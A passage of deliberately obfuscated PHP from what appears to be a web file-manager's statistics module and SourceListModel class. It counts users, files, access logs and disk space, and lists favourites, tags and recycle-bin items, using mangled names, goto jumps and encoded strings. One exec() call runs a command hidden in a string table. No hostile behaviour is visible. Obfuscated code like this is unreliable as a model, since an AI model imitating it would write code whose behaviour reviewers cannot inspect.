($EÕ³¹­¦œª[$Cğ¾Šñ™±½] as $fŒÀ©‹è·æ => $A©…£‹¹”ã) { $A„–Â¸Ø‹Ê[$fŒÀ©‹è·æ] = 0; } $CÏŞ“øİ„´[] = $A„–Â¸Ø‹Ê; } $b³ŸˆåšâÇ = array(); foreach ($CÏŞ“øİ„´ as $A©…£‹¹”ã) { if ($Cğ¾Šñ™±½ == $A¿Šñ´ª”ù[2041] && $A©…£‹¹”ã[$A¿Šñ´ª”ù[2043]] > $A©…£‹¹”ã[$A¿Šñ´ª”ù[701]]) { $A©…£‹¹”ã[$A¿Šñ´ª”ù[2043]] = $A©…£‹¹”ã[$A¿Šñ´ª”ù[701]]; } foreach ($EÕ³¹­¦œª[$Cğ¾Šñ™±½] as $fŒÀ©‹è·æ => $FÜï¦ù½¨Œ) { $Fè£öˆÒ¦£ = array($A¿Šñ´ª”ù[210] => $A©…£‹¹”ã[$A¿Šñ´ª”ù[210]], $A¿Šñ´ª”ù[1351] => $FÜï¦ù½¨Œ); $Fè£öˆÒ¦£[$A°Û”è÷Ş[$Cğ¾Šñ™±½]] = isset($A©…£‹¹”ã[$fŒÀ©‹è·æ]) ? $A©…£‹¹”ã[$fŒÀ©‹è·æ] : 0; $b³ŸˆåšâÇ[] = $Fè£öˆÒ¦£; } } goto aæÀ»¡¨ï; BÖßá’Šô: $A¿Šñ´ª”ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->init($Cğ¾Šñ™±½)) { return !1; } $CÏŞ“øİ„´ = $this->trendList($Cğ¾Šñ™±½); goto d©Ë÷ïÓÆ; Bï¸«ÚÑãÑ: } public function validDate($EòáàÛÉ», $FŠ©ÒŠØ÷Š) { goto EíÊ§ÄóëÃ; EíÊ§ÄóëÃ: $e»ŠëèêŒœ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÇÎø‹ÇçÈ = date($e»ŠëèêŒœ[2046], strtotime($e»ŠëèêŒœ[2047])); $eÕ’µ’ê¥ = array($eÇÎø‹ÇçÈ); goto eïœ©µİŠà; C³ïÏ°Î²½: return $eÕ’µ’ê¥; goto dÌ„³Àâïµ; eïœ©µİŠà: switch ($EòáàÛÉ») { case $e»ŠëèêŒœ[1427]: $fé›Åó‡ğò = mktime(0, 0, 0, date($e»ŠëèêŒœ[2063]), date($e»ŠëèêŒœ[2064]) - date($e»ŠëèêŒœ[1232]) + 7 - 7, date($e»ŠëèêŒœ[2065])); $cƒÅ‡áô„Ö = 0; do { $bíë’…Ä«ª = date($e»ŠëèêŒœ[2046], $fé›Åó‡ğò - 3600 * 24 * 7 * $cƒÅ‡áô„Ö); $eÕ’µ’ê¥[] = $bíë’…Ä«ª; $cƒÅ‡áô„Ö++; } while ($FŠ©ÒŠØ÷Š < $bíë’…Ä«ª); break; case $e»ŠëèêŒœ[1425]: $cƒÅ‡áô„Ö = 1; do { $b¬³†³İËê = date($e»ŠëèêŒœ[2066], strtotime("\55\40{$cƒÅ‡áô„Ö}\40\155\x6f\156\164\x68\x73")); $eÕ’µ’ê¥[] = $b¬³†³İËê; $cƒÅ‡áô„Ö++; } while ($FŠ©ÒŠØ÷Š < $b¬³†³İËê); break; case $e»ŠëèêŒœ[1734]: $D”ÊÁè†Íæ = (int) date($e»ŠëèêŒœ[2065], strtotime($FŠ©ÒŠØ÷Š)); $E¬¤ØÚƒÃã = (int) date($e»ŠëèêŒœ[2065]); if ($D”ÊÁè†Íæ >= $E¬¤ØÚƒÃã) { break; } for ($D”ÊÁè†Íæ; $D”ÊÁè†Íæ < $E¬¤ØÚƒÃã; $D”ÊÁè†Íæ++) { $eÕ’µ’ê¥[] = $D”ÊÁè†Íæ . $e»ŠëèêŒœ[2067]; } break; default: break; } if ($FŠ©ÒŠØ÷Š > end($eÕ’µ’ê¥)) { array_pop($eÕ’µ’ê¥); } sort($eÕ’µ’ê¥); goto C³ïÏ°Î²½; dÌ„³Àâïµ: } public function listTable($eîŸ£õ‚õï) { $c–°ˆÑ„Æ® = ucfirst($eîŸ£õ‚õï); return Model($c–°ˆÑ„Æ®)->listData(); } public function option($cæî•åÜ) { $Böİ‘ŠÕ¤˜ = $_SERVER[³‘’¼äÑ™ÔÍ][2068] . ucfirst($cæî•åÜ); return $this->{$Böİ‘ŠÕ¤˜}(); } private function optionUser() { goto Dİ³ÎÀ¬‚è; B‰ˆ´öİ: $dÇÁøéÚò = strtotime($BÜàù’¬»[2070]); $D¯‹Ÿò³å¸ = array($BÜàù’¬»[2071] => array($BÜàù’¬»[932], $dÇÁøéÚò)); $FƒŠÊ­ç = (int) Model($BÜàù’¬»[477])->where($D¯‹Ÿò³å¸)->count($BÜàù’¬»[1445]); goto c¯Ô…°æÁë; Dİ³ÎÀ¬‚è: $BÜàù’¬» =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e¼Í‰ÃÂ = Model($BÜàù’¬»[477])->count($BÜàù’¬»[1445]); $A–ê‹×¼”“ = Model($BÜàù’¬»[477])->where($BÜàù’¬»[2069])->count($BÜàù’¬»[1445]); goto B‰ˆ´öİ; c¯Ô…°æÁë: if (!$FƒŠÊ­ç) { $FƒŠÊ­ç = 1; } $dÇÁøéÚò = strtotime(date($BÜàù’¬»[2050])); $D¯‹Ÿò³å¸ = array($BÜàù’¬»[2071] => array($BÜàù’¬»[932], $dÇÁøéÚò)); goto bÈÁ—Êî•š; bÈÁ—Êî•š: $cëÖ·ŞíÙ = Model($BÜàù’¬»[477])->where($D¯‹Ÿò³å¸)->count($BÜàù’¬»[1445]); return array($BÜàù’¬»[698] => (int) $e¼Í‰ÃÂ, $BÜàù’¬»[2072] => (int) ($e¼Í‰ÃÂ - $A–ê‹×¼”“), $BÜàù’¬»[2073] => (int) $A–ê‹×¼”“, $BÜàù’¬»[2074] => (int) $cëÖ·ŞíÙ, $BÜàù’¬»[2075] => $FƒŠÊ­ç); goto A”¾éé¥ÚÆ; A”¾éé¥ÚÆ: } private function optionFile() { goto DéÚ•¡×”ğ; fÓÑ‹Şğ…ò: $A³§‹†¬ÊØ = Model($dÎ¨ËŒ³Õ[756])->where($a†¥ÁÕÆÎµ)->sum($dÎ¨ËŒ³Õ[77]); $B÷÷‘Ã•µ  = Model($dÎ¨ËŒ³Õ[756])->where($a†¥ÁÕÆÎµ)->count($dÎ¨ËŒ³Õ[369]); return array($dÎ¨ËŒ³Õ[701] => $BĞçîÀÈÄ¢, $dÎ¨ËŒ³Õ[2043] => $AŠ§ƒä¦õ, $dÎ¨ËŒ³Õ[2076] => $BĞçîÀÈÄ¢ - $AŠ§ƒä¦õ, $dÎ¨ËŒ³Õ[2077] => (int) $A³§‹†¬ÊØ, $dÎ¨ËŒ³Õ[703] => (int) $e…·²•¤‘í, $dÎ¨ËŒ³Õ[2078] => (int) $B÷÷‘Ã•µ ); goto AœÍøñ¤ƒš; DéÚ•¡×”ğ: $dÎ¨ËŒ³Õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÑöãà‰Ç = $this->sourceSize(); $BĞçîÀÈÄ¢ = $BÑöãà‰Ç[$dÎ¨ËŒ³Õ[77]]; goto d²¹ëå˜Õ; d²¹ëå˜Õ: $AŠ§ƒä¦õ = $BÑöãà‰Ç[$dÎ¨ËŒ³Õ[2043]]; $e…·²•¤‘í = Model($dÎ¨ËŒ³Õ[756])->where(array($dÎ¨ËŒ³Õ[370] => 0))->count($dÎ¨ËŒ³Õ[369]); $a†¥ÁÕÆÎµ = array($dÎ¨ËŒ³Õ[370] => 0, $dÎ¨ËŒ³Õ[187] => array($dÎ¨ËŒ³Õ[932], strtotime(date($dÎ¨ËŒ³Õ[2050])))); goto fÓÑ‹Şğ…ò; AœÍøñ¤ƒš: } private function optionAccess() { $E–Ù‚ÀÔ™Û =& $_SERVER[³‘’¼äÑ™ÔÍ]; return array($E–Ù‚ÀÔ™Û[698] => $this->typeLogCnt(), $E–Ù‚ÀÔ™Û[103] => $this->typeLogCnt($E–Ù‚ÀÔ™Û[103]), $E–Ù‚ÀÔ™Û[404] => $this->typeLogCnt($E–Ù‚ÀÔ™Û[404]), $E–Ù‚ÀÔ™Û[2079] => $this->typeLogCnt($E–Ù‚ÀÔ™Û[2079]), $E–Ù‚ÀÔ™Û[2080] => $this->typeLogCnt($E–Ù‚ÀÔ™Û[2080]), $E–Ù‚ÀÔ™Û[535] => $this->typeLogCnt($E–Ù‚ÀÔ™Û[33], $E–Ù‚ÀÔ™Û[2054])); } private function typeLogCnt($EàØº››Ë½ = '', $c…Ğ®Ö¶Š« = "\x69\x64") { goto AæÜµÀÖ…; AæÜµÀÖ…: $d·°òˆæÓ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FÀø˜¨‰İË = array($d·°òˆæÓ[103] => array($d·°òˆæÓ[2081], $d·°òˆæÓ[2082]), $d·°òˆæÓ[404] => array($d·°òˆæÓ[2083], $d·°òˆæÓ[2084]), $d·°òˆæÓ[2079] => array($d·°òˆæÓ[2085], $d·°òˆæÓ[2086], $d·°òˆæÓ[2087]), $d·°òˆæÓ[2080] => array($d·°òˆæÓ[2088], $d·°òˆæÓ[2089]), $d·°òˆæÓ[2090] => array($d·°òˆæÓ[2091], $d·°òˆæÓ[2092], $d·°òˆæÓ[2093])); $c—İ¹Œ‹êÙ = strtotime(date($d·°òˆæÓ[2050])); goto FªÁê²Ø³; e¡Ì÷Âøˆ: return (int) $c…í²«óÒ; goto F×¼ØÉÍÜÏ; FªÁê²Ø³: $fë ‘È¶–Ó = array($d·°òˆæÓ[187] => array($d·°òˆæÓ[932], $c—İ¹Œ‹êÙ)); if ($EàØº››Ë½) { $fë ‘È¶–Ó[$d·°òˆæÓ[29]] = array($d·°òˆæÓ[7], $FÀø˜¨‰İË[$EàØº››Ë½]); } $c…í²«óÒ = Model($d·°òˆæÓ[2053])->where($fë ‘È¶–Ó)->count($c…Ğ®Ö¶Š«); goto e¡Ì÷Âøˆ; F×¼ØÉÍÜÏ: } private function optionServer() { goto cæˆÚº–‹•; A‹òŸÃÁ³¨: if ($f£Â¥òôî‡ == $Cá‘·áÎË[727]) { $eçßæ‹İø = explode($Cá‘·áÎË[1080], $CÕÄÓ„„ÑÕ[$Cá‘·áÎË[891]]); $f£Â¥òôî‡ = $eçßæ‹İø[0]; } if ($f£Â¥òôî‡ == $Cá‘·áÎË[730] || $f£Â¥òôî‡ == $Cá‘·áÎË[731]) { $D‹·Ô¶ùÀ­ = Model()->db()->query($Cá‘·áÎË[2094]); $fò¥²†ã“Œ = $D‹·Ô¶ùÀ­[0] && isset($D‹·Ô¶ùÀ­[0][$Cá‘·áÎË[1350]]) ? $D‹·Ô¶ùÀ­[0][$Cá‘·áÎË[1350]] : 0; $f£Â¥òôî‡ = $Cá‘·áÎË[2095] . ($fò¥²†ã“Œ ? $Cá‘·áÎË[8] . $fò¥²†ã“Œ : $Cá‘·áÎË[33]); } $c…Õ£ÕÓµù = $GLOBALS[$Cá‘·áÎË[6]][$Cá‘·áÎË[337]][$Cá‘·áÎË[758]]; goto e‘êøŒÂÉ; EèÆ­˜§‹Ş: $C ÔÕÚùóÇ = $Aö˜”£âº[0]; $CÕÄÓ„„ÑÕ = $GLOBALS[$Cá‘·áÎË[6]][$Cá‘·áÎË[17]]; $f£Â¥òôî‡ = $CÕÄÓ„„ÑÕ[$Cá‘·áÎË[892]]; goto A‹òŸÃÁ³¨; Cè¹šìˆ¥: $dœÌšğò»Ë = array($Cá‘·áÎË[747] => $céãóÖ†ç[$Cá‘·áÎË[367]]); $D¥Çøâ•Š¤ = Model($Cá‘·áÎË[422])->where($dœÌšğò»Ë)->sum($Cá‘·áÎË[77]); $Aö˜”£âº = explode($Cá‘·áÎË[50], $_SERVER[$Cá‘·áÎË[139]]); goto EèÆ­˜§‹Ş; cæˆÚº–‹•: $Cá‘·áÎË =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E·Ç„ã„Ö = $this->diskDriver(); $céãóÖ†ç = KodIO::defaultDriver(); goto Cè¹šìˆ¥; e‘êøŒÂÉ: return array($Cá‘·áÎË[2096] => $E·Ç„ã„Ö ? $E·Ç„ã„Ö[$Cá‘·áÎË[2097]] : 0, $Cá‘·áÎË[2098] => $E·Ç„ã„Ö ? $E·Ç„ã„Ö[$Cá‘·áÎË[2099]] : 0, $Cá‘·áÎË[2100] => (int) $céãóÖ†ç[$Cá‘·áÎË[2097]] * 1024 * 1024 * 1024, $Cá‘·áÎË[2101] => (int) $D¥Çøâ•Š¤, $Cá‘·áÎË[2102] => ucfirst($C ÔÕÚùóÇ), $Cá‘·áÎË[2103] => $Cá‘·áÎË[2104] . PHP_VERSION, $Cá‘·áÎË[2105] => phpBuild64() ? 64 : 32, $Cá‘·áÎË[697] => str_replace($Cá‘·áÎË[2106], $Cá‘·áÎË[908], $f£Â¥òôî‡), $Cá‘·áÎË[337] => ucfirst($c…Õ£ÕÓµù), $Cá‘·áÎË[28] => $_SERVER[$Cá‘·áÎË[2107]]); goto fæöá½³‡¸; fæöá½³‡¸: } private function diskDriver() { goto C©†ğÍğ‚Š; fàë®¡§ª¨: $EÔŸùÆ·ß = $bÕ§ˆ‰˜á© - @disk_free_space($Bö­ÎÖ‚’Š); return array($Fîë–Ò×ŒŠ[2097] => $bÕ§ˆ‰˜á©, $Fîë–Ò×ŒŠ[2099] => $EÔŸùÆ·ß); goto cÂ²‹ˆ¶¨; C©†ğÍğ‚Š: $Fîë–Ò×ŒŠ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bö­ÎÖ‚’Š = $Fîë–Ò×ŒŠ[8]; $f±ó¬„“óŠ = $GLOBALS[$Fîë–Ò×ŒŠ[6]][$Fîë–Ò×ŒŠ[2108]] == $Fîë–Ò×ŒŠ[2109]; goto fË¡’ß™ÒÎ; fË¡’ß™ÒÎ: if ($f±ó¬„“óŠ) { $Bö­ÎÖ‚’Š = $Fîë–Ò×ŒŠ[2110]; if (function_exists($Fîë–Ò×ŒŠ[2111])) { exec($Fîë–Ò×ŒŠ[2112], $d£ÃÆ©ùğ˜); $Bö­ÎÖ‚’Š = $d£ÃÆ©ùğ˜[1] . $Fîë–Ò×ŒŠ[8]; } } if (!file_exists($Bö­ÎÖ‚’Š)) { return; } $bÕ§ˆ‰˜á© = @disk_total_space($Bö­ÎÖ‚’Š); goto fàë®¡§ª¨; cÂ²‹ˆ¶¨: } public function fileChart($eçİÅ±´…) { goto Fëá™¥ì¸ó; DÊÚã ô†: $A¨÷è†¢ = $this->sourceSize(); $eÙË´ñƒ¾ = array($c¶Š–„àôÇ[461] => 0, $c¶Š–„àôÇ[371] => 1); $e¨¹ÒÉë´Ü = Model($c¶Š–„àôÇ[756])->where($eÙË´ñƒ¾)->sum($c¶Š–„àôÇ[77]); goto Aì’®Şíˆ; Aì’®Şíˆ: $eÙË´ñƒ¾[$c¶Š–„àôÇ[371]] = 2; $F¯¼©ÕÒŒ = Model($c¶Š–„àôÇ[756])->where($eÙË´ñƒ¾)->sum($c¶Š–„àôÇ[77]); return array($c¶Š–„àôÇ[701] => $A¨÷è†¢[$c¶Š–„àôÇ[77]], $c¶Š–„àôÇ[2043] => $A¨÷è†¢[$c¶Š–„àôÇ[2043]], $c¶Š–„àôÇ[2044] => (int) $e¨¹ÒÉë´Ü, $c¶Š–„àôÇ[2045] => (int) $F¯¼©ÕÒŒ); goto BÜ‚’è”±­; Fëá™¥ì¸ó: $c¶Š–„àôÇ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (isset($eçİÅ±´…[$c¶Š–„àôÇ[1445]])) { return Model($c¶Š–„àôÇ[756])->userFileTypeProfile($eçİÅ±´…[$c¶Š–„àôÇ[1445]]); } if (isset($eçİÅ±´…[$c¶Š–„àôÇ[2113]])) { return Model($c¶Š–„àôÇ[756])->groupFileTypeProfile($eçİÅ±´…[$c¶Š–„àôÇ[2113]]); } goto DÊÚã ô†; BÜ‚’è”±­: } private function sourceSize() { $aÎŸ•êÊ¿¼ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BØ³ç¥Ëî² = Model($aÎŸ•êÊ¿¼[756])->where(array($aÎŸ•êÊ¿¼[370] => 0))->sum($aÎŸ•êÊ¿¼[77]); $A„çâò¦„ = Model($aÎŸ•êÊ¿¼[422])->sum($aÎŸ•êÊ¿¼[77]); if ($A„çâò¦„ > $BØ³ç¥Ëî²) { $A„çâò¦„ = $BØ³ç¥Ëî²; } return array($aÎŸ•êÊ¿¼[77] => (int) $BØ³ç¥Ëî², $aÎŸ•êÊ¿¼[2043] => (int) $A„çâò¦„); } } goto A¡Ÿ®××®Ü; F·¯®ñØ‚Ú: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\x62\154\x65\116\x61\155\x65" => "\x69\x6f\137\x73\157\x75\x72\143\x65\x5f\x6d\x65\x74\x61", "\x6d\x65\x74\x61\106\x69\145\x6c\144" => "\163\x6f\165\162\143\x65\111\x44"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\x69\155\145", "\164\x69\155\x65", "\151\x6e\x73\x65\162\164", "\146\165\x6e\x63\164\x69\157\x6e"), array("\143\162\x65\x61\x74\x65\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\146\165\x6e\143\x74\x69\157\156"), array("\166\x69\145\167\x54\x69\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\162\x74", "\x66\x75\x6e\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($aÒË²‚â“µ) { return $this->listSource(array($_SERVER[³‘’¼äÑ™ÔÍ][368] => $aÒË²‚â“µ)); } public function typeName($C¶‘‡ƒáÜÃ) { static $D´ÖåšÔò× = array(self::TYPE_SYSTEM => "\163\x79\x73\x74\145\x6d", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\165\x70"); return $D´ÖåšÔò×[$C¶‘‡ƒáÜÃ . $_SERVER[³‘’¼äÑ™ÔÍ][33]]; } public function sourceListInfo($bòâÑ‡×ñ, $DÆŒ‘Ş³½‚ = false) { goto bŒ¾»ŒÚ‹Ú; BôÀ½¥‚¥ˆ: return array_to_keyvalue($CõÜ³‘ÅîÂ, $fƒÓŠïÍ[369]); goto aË÷ğÒÆ™; FÎñí”†ì: if (!$bòâÑ‡×ñ) { return array(); } $CõÜ³‘ÅîÂ = $this->where(array($fƒÓŠïÍ[369] => array($fƒÓŠïÍ[7], $bòâÑ‡×ñ)))->select(); $this->_listDataApply($CõÜ³‘ÅîÂ, $DÆŒ‘Ş³½‚); goto BôÀ½¥‚¥ˆ; bŒ¾»ŒÚ‹Ú: $fƒÓŠïÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bòâÑ‡×ñ = $bòâÑ‡×ñ ? $bòâÑ‡×ñ : array(); $bòâÑ‡×ñ = array_filter(array_unique($bòâÑ‡×ñ)); goto FÎñí”†ì; aË÷ğÒÆ™: } public function pathInfoFilter($BŞ÷ŒˆÌ«ğ) { goto aø•¶ÈËÉ; aø•¶ÈËÉ: $C•ó‰ÓéÑ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[75]] = KodIO::make($BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[369]]); $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[29]] = $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[370]] == 1 ? $C•ó‰ÓéÑ[76] : $C•ó‰ÓéÑ[167]; goto a’Ò‡ÃŸ¬; a’Ò‡ÃŸ¬: $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[371]] = $this->typeName($BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[371]]); if ($BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[370]] != 1) { $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[160]] = $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[372]]; unset($BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[372]]); } $aõ†Íã š = $C•ó‰ÓéÑ[373]; goto AÛì™¾¤Øí; AÛì™¾¤Øí: $aõ†Íã š .= $C•ó‰ÓéÑ[374]; $aõ†Íã š .= $C•ó‰ÓéÑ[375]; $c”¥š“„ƒ¹ = explode($C•ó‰ÓéÑ[47], $aõ†Íã š); goto Cè­àˆ›–î; Cè­àˆ›–î: if (isset($BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[376]]) && $BŞ÷ŒˆÌ«ğ[$C•ó‰ÓéÑ[376]][$C•ó‰ÓéÑ[377]] == -1) { $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[187]); $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[107]); $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[378]); $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[379]); $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[77]); $c”¥š“„ƒ¹ = array_remove_value($c”¥š“„ƒ¹, $C•ó‰ÓéÑ[380]); } $BŞ÷ŒˆÌ«ğ = array_field_key($BŞ÷ŒˆÌ«ğ, $c”¥š“„ƒ¹); return $BŞ÷ŒˆÌ«ğ; goto AÒ·ºöŠ¹; AÒ·ºöŠ¹: } public function listUserFav() { goto d×Ï¥œ¹ÁÚ; AÁ×´œ„ÂÎ: foreach ($f’ØÉ¤àâö as &$c¥®Ö¤†´) { $c¥®Ö¤†´ = array($fÆÓ„™÷ƒ±[385] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[367]], $fÆÓ„™÷ƒ±[386] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[28]], $fÆÓ„™÷ƒ±[387] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[75]], $fÆÓ„™÷ƒ±[388] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[29]], $fÆÓ„™÷ƒ±[389] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[187]], $fÆÓ„™÷ƒ±[390] => $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[107]]); if ($c¥®Ö¤†´[$fÆÓ„™÷ƒ±[29]] == $fÆÓ„™÷ƒ±[382] && $e›½ÑÉ[$c¥®Ö¤†´[$fÆÓ„™÷ƒ±[75]]]) { $c¥®Ö¤†´[$fÆÓ„™÷ƒ±[391]] = $e›½ÑÉ[$c¥®Ö¤†´[$fÆÓ„™÷ƒ±[75]]]; } } return $f’ØÉ¤àâö; goto e½ßŸ‡“±®; AÊ·âÑƒÑ: $bÁñ¤–µ»Œ = array_to_keyvalue($bÁñ¤–µ»Œ, $fÆÓ„™÷ƒ±[33], $fÆÓ„™÷ƒ±[75]); if ($bÁñ¤–µ»Œ) { $e›½ÑÉ = $this->listSource(array($fÆÓ„™÷ƒ±[383] => array($fÆÓ„™÷ƒ±[384], $bÁñ¤–µ»Œ))); } $e›½ÑÉ = array_to_keyvalue($e›½ÑÉ[$fÆÓ„™÷ƒ±[354]], $fÆÓ„™÷ƒ±[369]); goto AÁ×´œ„ÂÎ; d×Ï¥œ¹ÁÚ: $fÆÓ„™÷ƒ± =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f’ØÉ¤àâö = Model($fÆÓ„™÷ƒ±[381])->listData(); $bÁñ¤–µ»Œ = array_filter_by_field($f’ØÉ¤àâö, $fÆÓ„™÷ƒ±[29], $fÆÓ„™÷ƒ±[382]); goto AÊ·âÑƒÑ; e½ßŸ‡“±®: } public function listUserTag($fÊªªæãœ) { goto Fè´„¥×Šó; bò¾Úàù±: $fÈßâ­ÖÖç = array_to_keyvalue($fÈßâ­ÖÖç, $b¯£Ë°Å™Ÿ[33], $b¯£Ë°Å™Ÿ[75]); $BÜ–åÆéÛ° = array(); if ($fÈßâ­ÖÖç) { $e´…’Ëˆ = array($b¯£Ë°Å™Ÿ[383] => array($b¯£Ë°Å™Ÿ[384], $fÈßâ­ÖÖç)); $BÜ–åÆéÛ° = $this->listSource($e´…’Ëˆ); } goto cÔ‡ùäÀ¡¼; Fè´„¥×Šó: $b¯£Ë°Å™Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÛ÷‹Õ–µÛ = Model($b¯£Ë°Å™Ÿ[392])->listData(); $fÈßâ­ÖÖç = array_filter_by_field($DÛ÷‹Õ–µÛ, $b¯£Ë°Å™Ÿ[393], $fÊªªæãœ); goto bò¾Úàù±; cÔ‡ùäÀ¡¼: $this->listUserTagClear($fÈßâ­ÖÖç, $BÜ–åÆéÛ°, $fÊªªæãœ); return $BÜ–åÆéÛ°; goto C×³­ïî·İ; C×³­ïî·İ: } private function listUserTagClear($E…´Ò”÷…±, $EÃŸ‰‹®ÂÁ, $Eñë¡»ó‰) { goto B×ƒİªºÏ; FØš®Ê½Š: $C‡ŞñøÄ¬÷ = array_merge($eöğêá¾Ş¦, $a£‹’Óí­); foreach ($E…´Ò”÷…± as $aï²Üò®öÉ) { if (!in_array($aï²Üò®öÉ, $C‡ŞñøÄ¬÷)) { $c³¥ÜÎÆ©[] = $aï²Üò®öÉ; } } if (!$c³¥ÜÎÆ©) { return; } goto f¿”’‰áÂ; B÷º¼¥öª: $c³¥ÜÎÆ© = array(); $a£‹’Óí­ = array_to_keyvalue($EÃŸ‰‹®ÂÁ[$DËÏÛ÷áŸ[74]], $DËÏÛ÷áŸ[33], $DËÏÛ÷áŸ[369]); $eöğêá¾Ş¦ = array_to_keyvalue($EÃŸ‰‹®ÂÁ[$DËÏÛ÷áŸ[73]], $DËÏÛ÷áŸ[33], $DËÏÛ÷áŸ[369]); goto FØš®Ê½Š; f¿”’‰áÂ: Model($DËÏÛ÷áŸ[394])->removeFromTag($c³¥ÜÎÆ©, $Eñë¡»ó‰); goto Cµøä³Æºã; B×ƒİªºÏ: $DËÏÛ÷áŸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$E…´Ò”÷…±) { return; } if ($EÃŸ‰‹®ÂÁ && count($E…´Ò”÷…±) == $EÃŸ‰‹®ÂÁ[$DËÏÛ÷áŸ[351]][$DËÏÛ÷áŸ[352]]) { return; } goto B÷º¼¥öª; Cµøä³Æºã: } public function listUserRecycle() { $Dâ£µ·º°„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Däòƒ¤Õã = Model($Dâ£µ·º°„[395])->listData(); if (!$Däòƒ¤Õã) { return array(); } $E²ù…†¸õŞ = array($Dâ£µ·º°„[383] => array($Dâ£µ·º°„[384], $Däòƒ¤Õã), $Dâ£µ·º°„[396] => 1); return $this->listSource($E²ù…†¸õŞ); } public function listSource($FŠùØÇ•âô, $AÎŞØ“ = 3000) { goto cß»™—°ˆ; f†Áá™˜ŒÚ: return $aÇùÜ˜Ì§; goto BÕ¨šëÄ©’; A¥ã±ÂÂ£„: $aÇùÜ˜Ì§ = $this->field($aÏ³£È¿ùÄ)->_makeOrder()->where($FŠùØÇ•âô)->selectPage($AÎŞØ“); $this->_listDataApply($aÇùÜ˜Ì§[$CƒÔ®¹‹Ç»[354]]); $this->_listMake($aÇùÜ˜Ì§); goto f†Áá™˜ŒÚ; cß»™—°ˆ: $CƒÔ®¹‹Ç» =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($FŠùØÇ•âô[$CƒÔ®¹‹Ç»[397]])) { $FŠùØÇ•âô[$CƒÔ®¹‹Ç»[397]] = 0; } $aÏ³£È¿ùÄ = $CƒÔ®¹‹Ç»[398]; goto A¥ã±ÂÂ£„; BÕ¨šëÄ©’: } protected function _makeOrder() { goto c¤æ¸¶¶Ã¨; AÉ•Š„Âñè: if ($a¤Ó©Áò == $b›á” œêğ[28]) { } $c“î™ã‡Å‹ = $b›á” œêğ[409] . $b¨Ù¹ùÍ‡‹[$a¤Ó©Áò] . $b›á” œêğ[50] . $e‚Ì·¸Ø‹©[$AšÌÛÌï±]; return $this->order(rtrim(trim($c“î™ã‡Å‹), $b›á” œêğ[47])); goto aÛ¦ó‰²œŞ; aÇÍÕÛÏÑ: $AšÌÛÌï± = Input::get($b›á” œêğ[408], $b›á” œêğ[7], $E†—õ–¹ï, array_keys($e‚Ì·¸Ø‹©)); if (!in_array($a¤Ó©Áò, array_keys($b¨Ù¹ùÍ‡‹))) { $a¤Ó©Áò = $b›á” œêğ[28]; } if (!in_array($AšÌÛÌï±, array_keys($e‚Ì·¸Ø‹©))) { $a¤Ó©Áò = $b›á” œêğ[402]; } goto AÉ•Š„Âñè; c¤æ¸¶¶Ã¨: $b›á” œêğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C‚±êÒ¯™ = Model($b›á” œêğ[399])->get($b›á” œêğ[400]); $E†—õ–¹ï = Model($b›á” œêğ[399])->get($b›á” œêğ[401]); goto F…Ø»¯ˆš‘; F…Ø»¯ˆš‘: $e‚Ì·¸Ø‹© = array($b›á” œêğ[402] => $b›á” œêğ[403], $b›á” œêğ[404] => $b›á” œêğ[405]); $b¨Ù¹ùÍ‡‹ = array($b›á” œêğ[28] => $b›á” œêğ[28], $b›á” œêğ[77] => $b›á” œêğ[77], $b›á” œêğ[160] => $b›á” œêğ[372], $b›á” œêğ[378] => $b›á” œêğ[378], $b›á” œêğ[406] => $b›á” œêğ[379], $b›á” œêğ[187] => $b›á” œêğ[187], $b›á” 